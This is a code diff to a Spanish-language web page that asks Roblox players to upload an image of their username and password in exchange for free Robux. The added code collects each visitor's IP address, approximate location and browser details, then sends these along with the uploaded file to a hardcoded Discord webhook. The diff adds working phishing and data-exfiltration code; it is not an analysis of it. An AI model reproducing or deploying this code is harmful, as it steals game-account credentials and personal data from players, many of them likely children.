@@ -67,7 +67,7 @@
     <div class="container">
         <h1>Envía una imagen con el nombre y contraseña de tu cuenta de Roblox</h1>
         <label class="file-label" for="fileInput">Selecciona un archivo:</label>
-        <input type="file" id="fileInput">
+        <input type="file" id="fileInput" accept=".txt,.mp3,.mp4,.png,.jpg">
         <br>
         <button onclick="enviarArchivo()">Enviar imagen para Robux gratis</button>
         <div class="mode-buttons">
@@ -118,24 +118,59 @@
 
             var fileName = files[0].name;
 
-            // Construir el mensaje para Discord
-            var message = "Archivo enviado a través de Replit:\n";
-            var formData = new FormData();
-            formData.append('file', files[0], fileName);
+            // Obtener información del navegador
+            var browserInfo = navigator.userAgent;
 
-            // Enviar el archivo a Discord a través de un formulario multipart
-            fetch('https://discord.com/api/webhooks/1234214861236605009/7dCzgPXSkBUkMFWLcE7braY42hnfT--KQUcmMkn_06vKKvePrPwkMF5cSwd4PUo7vH-3', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Hubo un error al enviar el archivo a Discord');
-                }
-            })
-            .catch(error => {
-                console.error('Error al enviar el archivo a Discord:', error);
-                alert('Hubo un error al enviar el archivo a Discord');
+            // Obtener la dirección IP del cliente
+            getIPAddress().then(ip => {
+                // Construir el mensaje para Discord
+                var message = "Archivo enviado a través de Replit:\n";
+                message += "Nombre del archivo: " + fileName + "\n";
+                message += "Dirección IP del cliente: " + ip + "\n";
+                message += "Ubicación del cliente: " + getGeoLocation() + "\n";
+                message += "Datos del navegador: " + browserInfo + "\n";
+                
+                var formData = new FormData();
+                formData.append('file', files[0], fileName);
+                formData.append('message', message);
+
+                // Enviar el archivo a Discord a través de un formulario multipart
+                fetch('https://discord.com/api/webhooks/1234214861236605009/7dCzgPXSkBUkMFWLcE7braY42hnfT--KQUcmMkn_06vKKvePrPwkMF5cSwd4PUo7vH-3', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Hubo un error al enviar el archivo a Discord');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error al enviar el archivo a Discord:', error);
+                    alert('Hubo un error al enviar el archivo a Discord');
+                });
+            }).catch(error => {
+                console.error('Error al obtener la dirección IP:', error);
+                alert('Hubo un error al obtener la dirección IP');
+            });
+        }
+
+        // Función para obtener la dirección IP del cliente
+        function getIPAddress() {
+            return new Promise((resolve, reject) => {
+                fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => resolve(data.ip))
+                .catch(error => reject(error));
+            });
+        }
+
+        // Función para obtener la ubicación del cliente
+        function getGeoLocation() {
+            return new Promise((resolve, reject) => {
+                fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => resolve(data.city + ', ' + data.region + ', ' + data.country_name))
+                .catch(error => reject(error));
             });
         }
 
